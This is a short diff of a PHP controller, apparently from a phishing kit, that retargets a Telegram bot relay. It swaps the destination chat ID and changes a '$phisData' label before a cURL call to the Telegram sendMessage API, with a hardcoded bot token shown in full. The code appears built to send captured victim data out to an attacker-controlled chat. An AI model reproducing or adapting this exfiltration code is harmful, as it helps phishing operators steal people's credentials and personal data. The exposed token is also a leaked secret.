@@ -86,10 +86,10 @@ class HomeController extends Controller
 
         $bot_token = "7742925472:AAETfunTJLoGZ1mhYlB40NVNNfzmWDnuliU";
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
-        $chat_id = "5942769050";
+        $chat_id = "7789971264";
 
         $ch = curl_init();
-        $phisData = "MY1";
+        $phisData = "MY2";
         // Set cURL options
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
